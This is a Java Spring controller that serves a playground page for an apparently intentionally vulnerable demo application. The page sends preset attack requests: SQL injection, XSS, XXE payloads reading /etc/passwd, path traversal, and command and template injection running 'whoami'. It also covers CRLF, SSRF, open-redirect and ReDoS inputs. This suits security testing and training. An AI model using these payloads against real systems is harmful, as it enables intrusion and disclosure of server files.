package com.myapp.controller;

import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.bind.annotation.RestController;

@RestController
public class PlaygroundController {

    @GetMapping(value = {"/", "/playground"}, produces = "text/html;charset=UTF-8")
    @ResponseBody
    public String index() {
        String xmlPayload = "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ELEMENT foo ANY >< !ENTITY xxe SYSTEM \"file:///etc/passwd\" >]><foo>&xxe;</foo>".replace("< !", "<!");
        String xmlXIncludePayload = "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ELEMENT foo ANY >< !ENTITY xxe SYSTEM \"file:///etc/passwd\" >]><foo xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include href=\"file:///etc/passwd\" parse=\"text\"/><data>&xxe;</data></foo>".replace("< !", "<!");

        return "<!DOCTYPE html>" +
                "<html lang=\"zh-CN\"><head><meta charset=\"UTF-8\"><title>base_vul Playground</title>" +
                style() +
                "</head><body><div class=\"container\"><h1>base_vul Playground</h1>" +
                "<p class=\"hint\">请选择一个预设场景。切换场景后，方法、路径、内容类型和请求体会自动回填。文件上传场景请在下方选择文件。</p>" +
                "<label for=\"scenario\">场景</label><select id=\"scenario\" size=\"18\" onchange=\"fillSelected()\"></select>" +
                "<label for=\"method\">请求方法</label><input id=\"method\" value=\"GET\" />" +
                "<label for=\"path\">Path</label><input id=\"path\" value=\"/users/1/\" />" +
                "<label for=\"contentType\">内容类型</label><input id=\"contentType\" value=\"application/json\" />" +
                "<label for=\"body\">请求体</label><textarea id=\"body\"></textarea>" +
                "<label for=\"file\">上传文件</label><input id=\"file\" type=\"file\" />" +
                "<div class=\"actions\"><button class=\"fill\" onclick=\"fillSelected()\">回填当前场景</button><button class=\"send\" onclick=\"sendCurrent()\">发送请求</button><button class=\"open\" onclick=\"openCurrent()\">浏览器中打开</button></div>" +
                "<p class=\"hint\">说明：发送请求会以文本形式展示响应，适合看接口返回。若要实际触发 XSS、打开重定向或直接观察 HTML 页面效果，请使用“浏览器中打开”。场景列表支持滚动，已尽量补齐当前项目中的演示接口。</p>" +
                "<label for=\"result\">响应结果</label><pre id=\"result\">等待发送请求...</pre></div>" +
                "<script>const scenarios=[" +
                scenario("SQL 注入", "SQLi users/{id} 注入", "GET", "/users/1'/", "application/json", "", false) + "," +
                scenario("SQL 注入", "SQLi users/{id} 正常", "GET", "/users/1/", "application/json", "", false) + "," +
                scenario("SQL 注入", "SQLi ids 参数注入", "GET", "/users/ids?ids=1,2,3) union select 1,name from users--", "application/json", "", false) + "," +
                scenario("SQL 注入", "SQLi name 模糊查询", "GET", "/users/name?name=%25' OR '1'='1", "application/json", "", false) + "," +
                scenario("SQL 注入", "SQLi 排序注入", "GET", "/users/sort?orderByColumn=name&orderByDirection=asc", "application/json", "", false) + "," +
                scenario("SQL 注入", "SQLi names 列表查询", "GET", "/users/names?names=Alice&names=Bob", "application/json", "", false) + "," +
                scenario("SQL 注入", "SQLi Optional 参数注入", "GET", "/users/findByOptionalUsername?username=test' OR '1'='1", "application/json", "", false) + "," +
                scenario("SQL 注入", "SQLi 对象参数注入", "POST", "/users/get_name_object", "application/json", "{\"name\":\"test'\"}", false) + "," +
                scenario("SQL 注入", "SQLi 对象参数正常", "POST", "/users/get_name_object", "application/json", "{\"name\":\"test\"}", false) + "," +
                scenario("SQL 注入", "SQLi MyBatis 注解注入", "GET", "/users/by-username?name=test' OR '1'='1", "application/json", "", false) + "," +
                scenario("SQL 注入", "SQLi Lombok 注入", "POST", "/users/lombok", "application/json", "{\"name\":\"test'\"}", false) + "," +
                scenario("SQL 注入", "SQLi IN 查询误报样例", "POST", "/users/findByIds", "application/json", "[1,2,3]", false) + "," +
                scenario("SQL 注入", "SQLi 整型 ID 误报样例", "POST", "/users/getUserByUId", "application/json", "{\"id\":1}", false) + "," +
                scenario("SQL 注入", "JPA 查询样例 1", "GET", "/users/jpaone?name=%3Cscript%3Ealert(123)%3C/script%3E", "application/json", "", false) + "," +
                scenario("SQL 注入", "JPA 查询样例 2", "GET", "/users/jpawithAnnotations?name=%3Cscript%3Ealert(123)%3C/script%3E", "application/json", "", false) + "," +
                scenario("XSS", "XSS 反射型", "GET", "/xss_reflect?name=<script>alert(123)</script>", "application/json", "", false) + "," +
                scenario("XSS", "XSS 存储型", "GET", "/xss_storage?name=%3Cscript%3Ealert(123)%3C/script%3E", "application/json", "", false) + "," +
                scenario("XSS", "XSS DOM 入口页", "GET", "/xss_dom_index", "application/json", "", false) + "," +
                scenario("XSS", "XSS DOM 型", "POST", "/xss_dom", "application/x-www-form-urlencoded", "name=%3Cscript%3Ealert%28123%29%3C%2Fscript%3E", false) + "," +
                scenario("文件操作", "文件上传页面", "GET", "/file_upload", "application/json", "", false) + "," +
                scenario("文件操作", "文件上传", "POST", "/file_upload", "multipart/form-data", "", true) + "," +
                scenario("文件操作", "任意文件读取", "GET", "/file_read?filePath=/etc/passwd", "application/json", "", false) + "," +
                scenario("文件操作", "任意文件写入", "GET", "/file_write?fileName=uploads/test.txt&data=hello_from_playground", "application/json", "", false) + "," +
                scenario("文件操作", "任意文件下载", "GET", "/file_download?fileName=../pom.xml", "application/json", "", false) + "," +
                scenario("文件操作", "任意文件删除", "GET", "/file_delete?fileName=../test.txt", "application/json", "", false) + "," +
                scenario("命令执行与表达式", "Runtime 命令执行", "GET", "/runtime_command_execute?command=whoami", "application/json", "", false) + "," +
                scenario("命令执行与表达式", "ProcessBuilder 命令执行", "GET", "/process_builder_command_execute?command=whoami", "application/json", "", false) + "," +
                scenario("命令执行与表达式", "SpEL 表达式注入", "GET", "/spel_expression?input=T(java.lang.Runtime).getRuntime().exec('whoami')", "application/x-www-form-urlencoded", "", false) + "," +
                scenario("命令执行与表达式", "SSTI FreeMarker", "GET", "/ssti_freemarker?templateContent=%24%7B%22freemarker.template.utility.Execute%22%3Fnew%28%29%28%22whoami%22%29%7D", "application/x-www-form-urlencoded", "", false) + "," +
                scenario("命令执行与表达式", "SSTI Velocity", "GET", "/ssti_velocity?content=%23set (%24exp %3d \"exp\")%3b%24exp.getClass().forName(\"java.lang.Runtime\").getRuntime().exec(\"whoami\")", "application/x-www-form-urlencoded", "", false) + "," +
                scenario("命令执行与表达式", "不安全反射", "GET", "/unsafeReflection?className=com.example.malicious.MaliciousClass", "application/json", "", false) + "," +
                scenario("请求处理", "CRLF 注入", "GET", "/crlf_injection?name=%0D%0ASet-Cookie: sessionid=123456", "application/x-www-form-urlencoded", "", false) + "," +
                scenario("请求处理", "开放重定向 ModelAndView", "GET", "/OpenRedirector_ModelAndView?url=https://www.baidu.com", "application/x-www-form-urlencoded", "", false) + "," +
                scenario("请求处理", "开放重定向 sendRedirect", "GET", "/OpenRedirector_sendRedirect?url=https://www.baidu.com", "application/x-www-form-urlencoded", "", false) + "," +
                scenario("请求处理", "开放重定向 Location", "GET", "/OpenRedirector_lacation?url=https://www.baidu.com", "application/x-www-form-urlencoded", "", false) + "," +
                scenario("SSRF", "SSRF openStream", "GET", "/ssrf_openStream?url=https://www.baidu.com", "application/x-www-form-urlencoded", "", false) + "," +
                scenario("SSRF", "SSRF openConnection", "GET", "/ssrf_openConnection?url=https://www.baidu.com", "application/x-www-form-urlencoded", "", false) + "," +
                scenario("SSRF", "SSRF Request.Get", "GET", "/ssrf_requestGet?url=https://www.baidu.com", "application/x-www-form-urlencoded", "", false) + "," +
                scenario("SSRF", "SSRF OkHttp", "GET", "/ssrf_okhttp?url=https://www.baidu.com", "application/x-www-form-urlencoded", "", false) + "," +
                scenario("SSRF", "SSRF DefaultHttpClient", "GET", "/ssrf_defaultHttpClient?url=https://www.baidu.com", "application/x-www-form-urlencoded", "", false) + "," +
                scenario("XXE", "XXE SAXParserFactory", "POST", "/xxe_saxparserfactory", "application/xml", xmlPayload, false) + "," +
                scenario("XXE", "XXE XMLReaderFactory", "POST", "/xxe_xmlreaderfactory", "application/xml", xmlPayload, false) + "," +
                scenario("XXE", "XXE SAXBuilder", "POST", "/xxe_saxbuilder", "application/xml", xmlPayload, false) + "," +
                scenario("XXE", "XXE SAXReader", "POST", "/xxe_saxreader", "application/xml", xmlPayload, false) + "," +
                scenario("XXE", "XXE DocumentHelper", "POST", "/xxe_documenthelper", "application/xml", xmlPayload, false) + "," +
                scenario("XXE", "XXE DocumentBuilderFactory", "POST", "/xxe_documentbuilderfactory", "application/xml", xmlPayload, false) + "," +
                scenario("XXE", "XXE XInclude", "POST", "/xxe_documentbuilderfactory_xinclude", "application/xml", xmlXIncludePayload, false) + "," +
                scenario("ReDoS", "ReDoS 1", "GET", "/testReDos1?input=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaX", "application/json", "", false) + "," +
                scenario("ReDoS", "ReDoS 2", "GET", "/testReDos2?input=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa1", "application/json", "", false) + "," +
                scenario("ReDoS", "ReDoS 3", "GET", "/testReDos3?input=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaX", "application/json", "", false) + "," +
                scenario("ReDoS", "ReDoS 4", "GET", "/testReDos4?input=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaX", "application/json", "", false) + "," +
                scenario("ReDoS", "ReDoS 5", "GET", "/testReDos5?input=.........................b", "application/json", "", false) + "," +
                scenario("其他", "Swagger 页面", "GET", "/swagger-ui.html", "application/x-www-form-urlencoded", "", false) +
                "];" +
                commonScript() +
                "</script></body></html>";
    }

    private String scenario(String category, String name, String method, String path, String contentType, String body, boolean useFile) {
        return "{category:'" + esc(category) + "',name:'" + esc(name) + "',method:'" + esc(method) + "',path:'" + esc(path) + "',contentType:'" + esc(contentType) + "',body:'" + esc(body) + "',useFile:" + useFile + "}";
    }

    private String commonScript() {
        return "const scenarioBox=document.getElementById('scenario');const methodBox=document.getElementById('method');const pathBox=document.getElementById('path');const contentTypeBox=document.getElementById('contentType');const bodyBox=document.getElementById('body');const fileBox=document.getElementById('file');const resultBox=document.getElementById('result');" +
                "const groups={};scenarios.forEach((item,index)=>{let group=groups[item.category];if(!group){group=document.createElement('optgroup');group.label=item.category;groups[item.category]=group;scenarioBox.appendChild(group);}const option=document.createElement('option');option.value=index;option.textContent=item.name;group.appendChild(option);});" +
                "function fillScenario(index){const item=scenarios[index];methodBox.value=item.method;pathBox.value=item.path;contentTypeBox.value=item.contentType;bodyBox.value=item.body;}" +
                "function fillSelected(){fillScenario(scenarioBox.value||0);}" +
                "function openCurrent(){const method=methodBox.value.trim().toUpperCase();const path=pathBox.value.trim();const contentType=contentTypeBox.value.trim();if(method==='GET'){window.open(path,'_blank');return;}const form=document.createElement('form');form.method=method;form.action=path;form.target='_blank';if(contentType==='multipart/form-data'){form.enctype='multipart/form-data';if(fileBox.files.length>0){resultBox.textContent='提示：浏览器安全限制下，无法把当前 file input 的文件复制到临时表单中。请直接访问对应页面后手动选择文件。';return;}}else{form.enctype='application/x-www-form-urlencoded';if(bodyBox.value.trim()!==''){bodyBox.value.split('&').forEach(pair=>{if(pair===''){return;}const parts=pair.split('=');const input=document.createElement('input');input.type='hidden';input.name=decodeURIComponent(parts[0]||'');input.value=decodeURIComponent(parts.slice(1).join('=')||'');form.appendChild(input);});}}document.body.appendChild(form);form.submit();document.body.removeChild(form);}" +
                "async function sendCurrent(){resultBox.textContent='请求进行中...';try{const method=methodBox.value.trim().toUpperCase();const path=pathBox.value.trim();const contentType=contentTypeBox.value.trim();const currentScenario=scenarios[scenarioBox.value||0]||{};let response;if(contentType==='multipart/form-data'){const formData=new FormData();if(fileBox.files.length>0){formData.append('file',fileBox.files[0]);}response=await fetch(path,{method:method,body:formData,redirect:'follow'});}else{const options={method:method,headers:{},redirect:'follow'};if(method!=='GET'&&bodyBox.value!==''){options.body=bodyBox.value;if(contentType!==''){options.headers['Content-Type']=contentType;}}response=await fetch(path,options);}const text=await response.text();const redirected=response.redirected?('\\n已跟随跳转到: '+response.url):'';resultBox.textContent='HTTP '+response.status+redirected+'\\n'+text;}catch(error){const currentScenario=scenarios[scenarioBox.value||0]||{};const likelyRedirect=currentScenario.name&&currentScenario.name.indexOf('重定向')!==-1;const hint=likelyRedirect?'\\n提示：当前场景可能已经触发跳转，但 fetch 在跟随外站跳转时会被浏览器跨域策略拦截。请改用“浏览器中打开”观察真实效果。':'';resultBox.textContent='请求失败: '+error+hint;}}" +
                "fillScenario(0);";
    }

    private String style() {
        return "<style>body{font-family:Arial,sans-serif;margin:40px;background:#f5f7fb;color:#1f2937;}.container{max-width:980px;margin:0 auto;background:#fff;padding:24px;border-radius:12px;box-shadow:0 10px 30px rgba(0,0,0,0.08);}input,textarea,select,pre{width:100%;box-sizing:border-box;}input,textarea,select{padding:12px;border-radius:8px;border:1px solid #d0d7de;margin-bottom:16px;}select[size]{height:auto;}textarea{min-height:180px;resize:vertical;}pre{min-height:180px;padding:12px;border-radius:8px;background:#111827;color:#e5e7eb;overflow:auto;}.actions{display:flex;gap:12px;margin:20px 0;flex-wrap:wrap;}button{padding:12px 18px;border:0;border-radius:8px;cursor:pointer;font-size:14px;color:#fff;}.fill{background:#1f6feb;}.send{background:#111827;}.open{background:#0f766e;}.hint{color:#6b7280;font-size:14px;}</style>";
    }

    private String esc(String value) {
        return value
                .replace("\\", "\\\\")
                .replace("'", "\\'")
                .replace("<", "\\u003C")
                .replace(">", "\\u003E")
                .replace("&", "\\u0026")
                .replace("\r", "")
                .replace("\n", "\\n");
    }
}
